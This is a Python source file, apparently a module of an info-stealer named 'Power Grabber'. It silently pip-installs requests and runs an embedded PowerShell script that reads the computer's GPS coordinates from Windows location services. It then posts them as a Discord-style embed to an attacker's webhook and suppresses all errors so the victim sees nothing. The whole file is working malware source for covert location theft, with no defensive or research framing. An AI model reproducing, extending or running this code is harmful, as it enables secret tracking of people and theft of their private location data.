import subprocess
import json
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
powershell_script = """
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}
if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
else{
    $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
    $GL = $GL -split " "
    $Lat = $GL[0].Substring(11) -replace ".$"
    $Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}
$GPS
"""
process = subprocess.Popen(["powershell", "-Command", powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
if stderr:
    print(f"Error: {stderr.decode()}")
else:
    gps_info = stdout.decode().strip()
    if gps_info == "Location Services Off":
        print("Location Services are off.")
        latitude = None
        longitude = None
    else:
        gps_info = gps_info.replace("LAT = ", "").replace("LONG = ", "")
        latitude, longitude = gps_info.split(" ")
    if latitude and longitude:
        embed = {
            "username": "Power Grabber",
            "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
            "title": "🗺️ Location",
            "description": "GPS Coordinates",
            "fields": [
                {
                    "name": "Latitude",
                    "value": latitude,
                    "inline": True
                },
                {
                    "name": "Longitude",
                    "value": longitude,
                    "inline": True
                }
            ],
            "color": 0x8B0000
        }
    else:
        embed = {
            "username": "Power Grabber",
            "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
            "title": "🗺️ Location",
            "description": "Location Services are Off or GPS data unavailable.",
            "fields": [
                {
                    "name": "Latitude",
                    "value": "None",
                    "inline": True
                },
                {
                    "name": "Longitude",
                    "value": "None",
                    "inline": True
                },
                {
                    "name": " ",
                    "value": "Power Grabber | Made by Powercascade and Taktikal.exe",
                    "inline": True
                },
            ],
            "color": 0x8B0000
        }
    message = {
        "embeds": [embed]
    }
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(webhook_url, headers=headers, data=json.dumps(message))
        if response.status_code == 204:
            pass
        else:
            pass
    except Exception as e:
        pass
